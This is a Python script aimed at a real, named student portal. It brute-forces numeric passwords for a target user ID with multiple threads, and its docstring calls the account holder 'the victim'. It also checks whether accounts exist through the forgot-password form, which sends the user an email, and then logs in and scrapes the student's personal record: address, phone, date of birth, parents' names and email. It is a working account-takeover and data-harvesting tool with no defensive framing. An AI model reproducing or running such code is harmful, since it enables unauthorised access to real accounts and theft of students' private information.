import sys
import os

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import requests
import json
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
import re
from model.student import Student


def bruteforceLogin(user_id: str, start_from: int, batch_size: int = 100, threads: int = 10) -> str:
    """

    :param user_id: Portal userid of the victim
    :param start_from: Number from where password bruteforce should start
    :param batch_size: Number of login request sent at a time to portal
    :param threads: Specify number of threads to be used
    :return: Password string if cracked successfully else None
    """
    p = start_from
    q = start_from + batch_size
    muserId = user_id.replace("/", "%2F")
    pool = ThreadPoolExecutor(threads)
    session = requests.Session()

    while True:
        futures = []

        for i in range(p, q):
            future = pool.submit(attemptLogin, muserId, str(i), session)
            futures.append(future)

        for f in futures:
            if f.result() is not None:
                return f.result()

        if p > 9800:
            return None

        p += batch_size
        q += batch_size


def attemptLogin(user_id, password, session):
    url = 'https://saksham.sitslive.com/login'

    headers = {
        "accept": "*/*",
        "accept-language": "en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7",
        "cache-control": "no-cache",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "cookie": "ASP.NET_SessionId=w3xnaxbvl5d3j4gdz3xtlnf3",
        "origin": "https://saksham.sitslive.com",
        "priority": "u=1, i",
        "referer": "https://saksham.sitslive.com/login",
        "sec-ch-ua": "\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "x-microsoftajax": "Delta=true",
        "x-requested-with": "XMLHttpRequest"
    }

    payload = {
        "data-daw": "ScriptManager1=updatepanel%7CbtnLogin&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=GXq8WYlFoIyiG3kHh%2FyWm36EVSPnNg9oMUi9wBqeXZ5oLCwDaEF1fWGlZu6NIZKEGzs%2FZqM8kQDJ35ynh50OxuDTdeqaTh4wZe5gn2NIsPG1M9Ds%2BzDSx0hHu317Lrbw&__VIEWSTATEGENERATOR=C2EE9ABB&__EVENTVALIDATION=k9EujBZLYjXQ6rTY4Kfb27V%2FFrBy8Ba23xg9ZaR9inInhEHhMnDnorNbGIO4S1IWOPs2u1aAPCkn5ieUxwSc0CgIlxhouE9FPckXsb%2F078IUjLS6AJvoaw3K%2F%2BAABCmEBzF1Ae469WWe4mDfDZPlJyLwg8Y3lH9jol6vnwidKeaSu%2FewI8Hnv04%2BBd2lhQqFFWErXV4tmCmIKvRSer%2FfDZ1HHrJ3Vk%2FQdhUnj8JX2LHHfAeU5ALRWJxbSolA%2FDYVhU8PM7E3jQd1FBYJtVrqHwAgbSxV%2B6dPvyEDYjFbaiHkiz84m5JxTVPK53KMH%2Bpa&txtLoginID=" + user_id + "&txtPassword=" + password + "&ddlType=0&txtUserName=&__ASYNCPOST=true&btnLogin=Login",
    }

    response = session.post(url, headers=headers, data=json.dumps(payload))

    if "pageRedirect" in response.text:
        return password
    else:
        return None


def getSessionCookie(user_id, password):
    url = 'https://saksham.sitslive.com/login'
    session = requests.Session()

    headers = {
        "accept": "*/*",
        "accept-language": "en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7",
        "cache-control": "no-cache",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://saksham.sitslive.com",
        "priority": "u=1, i",
        "referer": "https://saksham.sitslive.com/login",
        "sec-ch-ua": "\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "x-microsoftajax": "Delta=true",
        "x-requested-with": "XMLHttpRequest"
    }

    payload = {
        "data-daw": "ScriptManager1=updatepanel%7CbtnLogin&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=GXq8WYlFoIyiG3kHh%2FyWm36EVSPnNg9oMUi9wBqeXZ5oLCwDaEF1fWGlZu6NIZKEGzs%2FZqM8kQDJ35ynh50OxuDTdeqaTh4wZe5gn2NIsPG1M9Ds%2BzDSx0hHu317Lrbw&__VIEWSTATEGENERATOR=C2EE9ABB&__EVENTVALIDATION=k9EujBZLYjXQ6rTY4Kfb27V%2FFrBy8Ba23xg9ZaR9inInhEHhMnDnorNbGIO4S1IWOPs2u1aAPCkn5ieUxwSc0CgIlxhouE9FPckXsb%2F078IUjLS6AJvoaw3K%2F%2BAABCmEBzF1Ae469WWe4mDfDZPlJyLwg8Y3lH9jol6vnwidKeaSu%2FewI8Hnv04%2BBd2lhQqFFWErXV4tmCmIKvRSer%2FfDZ1HHrJ3Vk%2FQdhUnj8JX2LHHfAeU5ALRWJxbSolA%2FDYVhU8PM7E3jQd1FBYJtVrqHwAgbSxV%2B6dPvyEDYjFbaiHkiz84m5JxTVPK53KMH%2Bpa&txtLoginID=" + user_id + "&txtPassword=" + password + "&ddlType=0&txtUserName=&__ASYNCPOST=true&btnLogin=Login",
    }

    session = session.post(url, headers=headers, data=json.dumps(payload))

    return session.cookies.get("ASP.NET_SessionId")


def getStudentDetailsHtml(session_id: str):
    url = "https://saksham.sitslive.com/StudentPanel/Pages/StudentPersonalDetails"

    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7",
        "cache-control": "max-age=0",
        "cookie": "ASP.NET_SessionId=" + session_id,
        "referer": "https://saksham.sitslive.com/StudentPanel/Pages/Dashboard",
        "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
    }

    response = requests.get(url, headers=headers)

    return response.text


def parseStudentDetailsHtmlToStudent(html):
    soup = BeautifulSoup(html, "html.parser")

    return Student(
        student_name=soup.find('span', id='PageContent_lblName').text,
        password="EMPTY",
        time_taken="EMPTY",
        student_id=soup.find('span', id='PageContent_lblID').text,
        category=soup.find('span', id='PageContent_lblCategory').text,
        roll=soup.find('span', id='PageContent_lblRollNo').text,
        enrollment_no=soup.find('span', id='PageContent_lblEnrollNo').text,
        email=soup.find('span', id='PageContent_lblEmail').text,
        address=soup.find('span', id='PageContent_lblCorrAdd').text,
        session=soup.find('span', id='PageContent_lblSession').text,
        admission_date=soup.find('span', id='PageContent_lblAdmissionDate').text,
        student_type=soup.find('span', id='PageContent_lblStudentType').text,
        phone=soup.find('span', id='PageContent_lblContactNo').text,
        father_name=soup.find('span', id='PageContent_lblFatherName').text,
        mother_name=soup.find('span', id='PageContent_lblMotherName').text,
        dob=soup.find('span', id='PageContent_lblDOB').text,
        gender=soup.find('span', id='PageContent_lblGender').text,
    )


# CAUTION: Sends an email to existing user if found one
def checkUserExistence(user_id):
    url = "https://saksham.sitslive.com/"

    headers = {
        "accept": "*/*",
        "accept-language": "en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7",
        "cache-control": "no-cache",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "cookie": "ASP.NET_SessionId=d3iffboltw1xr2kx40jwmyfq",
        "origin": "https://saksham.sitslive.com",
        "priority": "u=1, i",
        "referer": "https://saksham.sitslive.com/",
        "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "x-microsoftajax": "Delta=true",
        "x-requested-with": "XMLHttpRequest"
    }

    data = {
        "ScriptManager1": "updatepanel|btnForgotPassword",
        "__EVENTTARGET": "",
        "__EVENTARGUMENT": "",
        "__VIEWSTATE": "p3aUJNz9YICIB+JfjmKV4GFima1q3eE4tn5RJmdo3TGtQCSaTREe9WE9zi2qsoo4PnBvkbYMRHcZ6UNJFmTxqdZ4UOjKA3POYTZIU1uG0jfDlY9TBqz57+KMm7J95rxB",
        "__VIEWSTATEGENERATOR": "C2EE9ABB",
        "__EVENTVALIDATION": "mbnR2MaZk+x5aHKA1UR0m7DDbBp5Vx1aWh4VM9JvBzcYq74XRbfpLBKOm6EVjH/4HCcW+i/ZCNyj7DgCfAggMHg6SOY8onAl0ZMxKeIEdPSvyF/grYu1HnbndleD6NdCCmoXUbo7ramLhEqL+f3xn+E/9K+PQS7KxqwjFKK7nV8YZaP5ll4EsHusGUnNfz11kdt/7HC3QzfZL0QWp/PZ89c0uaMrINeqKe+5kooiBpZXl99NCZonIyeNCXO2GEnkElgighuvCXgP74jJM+DE8i05lM46dWtUK42ydseacJkPMtYa3vTs3uKYBeqG06ZI",
        "txtLoginID": "",
        "txtPassword": "",
        "ddlType": "2",
        "txtUserName": user_id,
        "__ASYNCPOST": "true",
        "btnForgotPassword": "Send Me!"
    }

    response = requests.post(url, headers=headers, data=data)

    #Extracts string from .notify("message") in response
    notification = re.search(r"\.notify\('(.+?)'\)", response.text).group(1)

    if notification == "Invalid User":
        return False
    else:
        return True


def getStudentDataFromSaksham(userid, password):
    cookie = getSessionCookie(userid, password)
    studentDetailsHtml = getStudentDetailsHtml(cookie)
    studentDetailData = parseStudentDetailsHtmlToStudent(studentDetailsHtml)
    return studentDetailData

